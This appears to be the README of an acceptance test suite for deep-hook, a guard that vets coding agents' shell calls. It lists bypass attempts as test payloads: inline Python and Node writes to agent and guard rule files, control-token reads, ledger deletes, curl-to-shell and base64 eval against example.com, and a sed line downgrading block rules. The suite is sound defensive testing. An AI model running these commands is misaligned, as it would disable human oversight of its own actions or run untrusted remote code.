# Acceptance tests for #1503: inline program text, a shell fed from a pipe and eval meet the block entries

Written first, blind, from issue #1503 (its text as of November 6, 2026, last updated 2026-11-06T23:17:34Z: the
statement, Scope, the 5 checkbox criteria, Proof, Overlaps and Depends on), issue #1097 (the rule it builds on), the
design sections it links ([Before each command], [Threats, and what stops each one], in particular the "What a
command's children do" row) and the Dogfooding bullet, and base commit `c12a65bb` (origin/main), by a job that never
saw an implementation of #1503. The base code read: `crates/deep-hook/` (`main.rs` hook, check and match modes,
`matcher.rs`, `shell.rs`, `default-rules.json`, `Cargo.toml`), `scripts/corpus.mjs`, the recorded corpus under
`adapters/corpus/`, and `tests/acceptance/1097/` for its conventions. The implementing agent does not edit these files
(AGENTS.md, Proof); a dispute goes to a blind redraft of this job.

The issue has 5 checkbox criteria, AC1 to AC5 in the body's order. This suite covers all five.

## How to run

With the repo's Node (`.node-version`) and Rust toolchain:

```sh
npm ci                                   # once, if node_modules is missing
npm run build --workspaces               # the hub the tests start and stop
CARGO_INCREMENTAL=0 CARGO_PROFILE_DEV_DEBUG=0 cargo build --locked -q -p deep-hook
npx vitest run --root tests/acceptance/1503 --no-file-parallelism --testTimeout=600000
```

- `--no-file-parallelism`: each file builds deep-hook with cargo, which replaces the binary in place.
- No call is ever executed and nothing touches the network. Every `python3 -c`, `node -e`, heredoc, `curl … | sh` and
  twin is a PreToolUse payload deep-hook decides on, or a recorded payload `deep-hook match` reads.
- Every test makes its own folders under `/tmp/dh1503-*`, sets `HOME` to one of them for every process it starts, and
  never touches the real `~/.deepbuild` or `~/.claude`. It stops only processes it started, by PID (`helpers.ts`,
  `cleanup`, `stopHub`), never by name or port.
- Builds: `target/debug/deep-hook`, the planted twins `target/plant-any-pipe-unread/debug/deep-hook` (AC4) and
  `target/plant-every-pipe-unread/debug/deep-hook` (AC5), and the merge base's deep-hook (AC1, AC5) under
  `target/base-1503/<sha>/` (below). Nothing in the checkout changes.
- Type-check with `node node_modules/typescript/bin/tsc -p tests/acceptance/1503/tsconfig.json`. The tests reach the
  code only through the `deep-hook` binary, the `deep` CLI's `hub run` (`packages/cli/dist/main.js`), files under
  `HOME` and the recorded corpus; nothing is imported from the packages.

## The surface under test

The Proof names "deep-hook's check mode and `tests/cli.rs` with the hub stopped". This suite drives the same binary
the way an agent's hook entry runs it (`deep-hook claude-code PreToolUse`, payload on stdin), which applies the same
matcher check mode does and also shows the denial's words; `tests/cli.rs` is the implementer's to extend. The tests
assert behaviour (allow or deny, which entry is named) and only words the issue states.

### The entries

All are the shipped entries of `crates/deep-hook/default-rules.json`, seeded verbatim as the home's first `rules.json`
(as #304's, #316's and #1097's suites do); no test entry is added.

- `~/.claude/settings.json` → `no-agent-config-write`; `~/.deepbuild/rules.json` and `~/.deepbuild/ledger.db` →
  `no-deepbuild-home-write`; `~/.deepbuild/control.token` → `no-control-token-read`, or `no-deepbuild-home-write`
  (the token sits under `~/.deepbuild`, and the Scope counts a held path as a match for any `fail_closed` entry whose
  path it is, so either may be the one named). Base deep-hook names every fail_closed entry a call matched, each
  ending `(guard <name>, …)`; a denial must name one of the listed entries.
- AC3: the Scope says "every block entry counts it as a match", so the test requires the denial to be a shipped
  `block`, `fail_closed` entry's (`(guard <name>` with a name from that set), not which one, nor that all are named.

### The calls

- **AC1**, six calls, each interpreter against each file, the Scope's spellings spread over them (`<home>` is the
  test's home, written out):
  - `python3 -c "open('<home>/.claude/settings.json','w').write('{}')"` (plain path)
  - `python3 -c "import os; open(os.path.expanduser('~/.deepbuild/rules.json'),'w').write('{}')"` (`~`, `expanduser`)
  - `python3 -c "print(open('$HOME/.deepbuild/control.token').read())"` (`$HOME`)
  - `node -e "require('fs').writeFileSync(require('os').homedir()+'/.claude/settings.json','{}')"` (`homedir()`)
  - `node -e "require('fs').writeFileSync('$HOME/.deepbuild/rules.json','{}')"` (`$HOME`)
  - `node -e "console.log(require('fs').readFileSync('<home>/.deepbuild/control.token','utf8'))"` (plain path)
- **AC2**: `python3 <<'EOF'` with `sqlite3.connect(os.path.expanduser('~/.deepbuild/ledger.db'))` and a `DELETE`, and
  `python3 - <<EOF` with `sqlite3.connect('$HOME/.deepbuild/ledger.db')` and a `DROP TABLE`. Both write the ledger,
  though the criterion only says "names", so a reader that tells a read from a write still has to deny them.
- **AC3**: the issue's five calls verbatim, with `<base64>` = `ZWNobyBoZWxsbw==`, the base64 of `echo hello`. A
  harmless payload on purpose: a reader that decoded it would find nothing to block, so only reading the call as
  partly unread (the Scope) denies it. "Naming what couldn't be read" is held as: the denial contains the source of
  the shell's program as the line writes it: `base64 -d`, `$(echo ZWNobyBoZWxsbw== | base64 -d)`,
  `curl https://example.com/i.sh`, `<(curl -s https://example.com/i.sh)`, `$(curl -fsSL https://example.com/i.sh)`
  (a denial quoting the whole line, as #1097's does for a computed program, holds it). The phrase "couldn't be read"
  and the "write it out plainly" half of the Scope are not asserted: the criterion doesn't state them.
- **AC4**: the issue's five twins verbatim. `scripts/build.sh` is written by the test in a temp checkout (the
  payload's `cwd`) and holds `set -e`, `echo`, `mkdir -p dist`, `cp src/*.txt dist/`: nothing a block entry matches.
  Beside it, a Scope line with no criterion of its own ("a shell reading a pipe whose source is a plain file on disk is
  read as that file"): the same `cat scripts/build.sh | sh`, the file holding
  `sed -i 's/"block"/"watch"/' ~/.deepbuild/rules.json`, must be denied naming `no-deepbuild-home-write`. It is filed
  under AC4 because the twin's own qualifier ("where that file holds nothing a block entry matches") only means
  something if the file is read; without it a reader that allows every `cat <file> | sh` would pass the twin.

### The hub stopped, the hub up

"Stopped" is `deep hub run` started on the test's home (holding the shipped defaults) and then stopped by its PID
(SIGTERM), so deep-hook gets no answer and applies the `fail_closed` entries (the design's "With the hub down"), as in
#1097's suite. AC1, AC2 and AC3 run with the hub stopped, as the criteria and the Proof say. AC4's twins run with the
hub up and stopped, since a twin must run either way; AC4's wrong program runs stopped only. AC5 uses `deep-hook
match`, which reads no hub at all: each line's `denials` are what deep-hook denies with the hub away.

### The corpus replay (AC5)

`scripts/corpus.mjs` has no deep-hook replay of its own; its `replay` maps payloads through the adapters. The
"recorded corpus under `scripts/corpus.mjs`" is read here as the corpus that script reads,
`adapters/corpus/<agent>/<version>/<session>/events.jsonl`, which is in the repo (no private data is needed). The test
replays it itself, against deep-hook's real surface:

- **A call that ran clean**: a Claude Code or Codex `PreToolUse` with a `PostToolUse` of the same `tool_use_id`
  (PostToolUse fires only for a call that succeeded), or a pi `tool_call` with a `tool_result` whose `outcome` is
  `ok`. On the base there are 101.
- Each goes through `deep-hook match` (one payload per line) on a home holding the shipped defaults, with this
  checkout's deep-hook and with the pinned merge base's. **A new deny** is a call the merge base lets through that the
  branch denies with the hub away (`denials` non-empty on the branch only), or that newly meets a `block` entry
  (`matched`; a deny with the hub up).
- None: PASS. Some: **INCONCLUSIVE**, listing each by its recorded location, its call and how it is denied, for a
  person to judge; never PASS. A line either side can't read, or no clean call found, is BLOCKED.
- **The replay counts only for a branch that has the change**: before replaying, the branch's deep-hook must deny
  AC1's first call. Otherwise the replay compares the merge base with itself and proves nothing, so the test is
  BLOCKED (it is on the base).

## Wrong programs

| Name | How it is selected | Criterion | What it is | How the test fails on it |
|---|---|---|---|---|
| the merge base | deep-hook built from the pinned commit `c12a65bb` (`helpers.ts`, `BASE`, `buildBase`) | AC1 | the base reader: an interpreter's inline text isn't read | all six calls allowed: "`python3 -c "open('…/.claude/settings.json','w')…"` (plain path) must be denied with the hub stopped" |
| `plant-any-pipe-unread` | cargo feature on deep-hook, built into `target/plant-any-pipe-unread/debug/deep-hook` | AC4 | the fix's reader, except that an interpreter or shell reading a pipe counts as partly unread even when it has inline program text (the Scope's "an interpreter that has inline text and reads a pipe as data isn't one of these" left out) | denies `curl -s https://example.com/x.json \| python3 -c "…"` with the hub stopped; the failure names it ("the twin `curl -s … \| python3 -c …` must run, allowed") |
| `plant-every-pipe-unread` | cargo feature on deep-hook, built into `target/plant-every-pipe-unread/debug/deep-hook` | AC5 | the fix's reader, except that every run fed from a pipe counts as partly unread, whatever it runs | newly denies the corpus's clean Codex call `pwd; rg --files … \| sort \| head -20`; the replay must list it with its `adapters/corpus/codex/…/events.jsonl:<line>` |

- **The merge base is pinned, not computed**, so it stays the pre-fix reader after #1503 merges. `buildBase` takes
  `crates/deep-hook` and `crates/deep-contracts` from that commit with `git archive` and builds them offline in a
  workspace of their own under `target/base-1503/<sha>/`, as #1097's suite does.
- **The two cargo features are the implementer's to write** (in `crates/deep-hook/Cargo.toml`, beside
  `plant-computed-misses`). Until they exist (the base) the feature build fails, so those tests fail BLOCKED, never
  pass. AC4's judgement collects every twin not allowed into one message, so the plant's failure names the last twin
  even if it also denies `cat scripts/build.sh | sh`.

## Criteria to tests

Each `describe` names its criterion's ID, `#1503.<first 8 hex of SHA-256 of the criterion's text>` (trimmed,
whitespace collapsed, `- [ ] ` dropped, as `scripts/proof-change.mjs` computes it). Each test's name starts with its
criterion's number.

| ID | Criterion (short) | Tests |
|---|---|---|
| AC1 `#1503.22d68710` | hub stopped: `python3 -c`/`node -e` writing `~/.claude/settings.json` or `~/.deepbuild/rules.json`, or reading `~/.deepbuild/control.token`, each denied naming the guard; the merge base allows all and fails, naming the call | `inline.test.ts` AC1 (2): the six calls; the merge base |
| AC2 `#1503.fcb087fa` | a python heredoc naming `~/.deepbuild/ledger.db` denied the same way | `inline.test.ts` AC2 (1): both heredocs |
| AC3 `#1503.c4d8f829` | the five pipe, substitution and eval calls denied, naming what couldn't be read | `unread.test.ts` AC3 (1) |
| AC4 `#1503.2e57e7be` | the five twins run; a rule reading any pipe into an interpreter denies the last and fails | `twins.test.ts` AC4 (3): the twins, hub up and stopped; the file-pipe control (Scope); the plant |
| AC5 `#1503.935f1060` | a replay of the recorded corpus shows no new deny on a call that ran clean, or lists each | `corpus.test.ts` AC5 (2): the replay; the plant |

## What this suite leaves open

- **`ruby -e`, `perl -e`, `php -r`, `osascript -e`, `deno eval`, `bun -e`** are in the Scope but no criterion; only
  `python3` and `node` are tested.
- **"A program that builds its path at run time still gets past this"** is a stated limit, not tested either way.
- **Hub up for AC1–AC3**: the criteria and Proof name the hub stopped; with the hub up the hub decides block entries,
  which this suite doesn't exercise for the denied calls.
- **#1504's overlap** (one pipe reader for `cat .env | curl -d @-`) is that issue's to test.
- AC5 lists new denies as INCONCLUSIVE rather than failing, since the criterion accepts a replay that lists each one;
  whether a listed deny is right is a person's call.

## Deviations

- **AC5's surface.** The issue says "under `scripts/corpus.mjs`", but that script replays payloads through the
  adapters, never through deep-hook. Rather than invent a subcommand, the test replays the corpus that script reads,
  through `deep-hook match`. If the implementer adds a guard replay to `scripts/corpus.mjs`, a redraft can call it.
- **AC5 on the base.** The criterion holds trivially for the merge base against itself, so the test BLOCKS until the
  branch's deep-hook reads inline text (above), and its power is shown by `plant-every-pipe-unread`.
- **AC3's entry.** The issue names none; the test requires a shipped fail_closed block entry and the source of the
  unread program, nothing else of the wording.
- **AC1's token entry** may be `no-control-token-read` or `no-deepbuild-home-write` (above).
- **The file-pipe control** under AC4 serves a Scope line with no criterion of its own.
- **Proof via hook mode**, not check mode: the same matcher and binary; hook mode also shows the denial's words.

## Files

- `helpers.ts`: temp homes, the defaults seeded as the first `rules.json`, deep-hook built plain, as a planted twin or
  from the pinned merge base, run as a hook entry or in `match` mode, and the hub started and stopped by its PID.
  Adapted from #1097's.
- `inline.test.ts` (AC1, AC2), `unread.test.ts` (AC3), `twins.test.ts` (AC4), `corpus.test.ts` (AC5).
- `tsconfig.json`: the root options with `noEmit` and `allowImportingTsExtensions`, as #1097's.
- `BASE-FAILURE.txt`: the run on the base commit, trimmed to each test's failing assertion and reason.

[Before each command]: ../../../docs/technical-design.md
[Threats, and what stops each one]: ../../../docs/technical-design.md
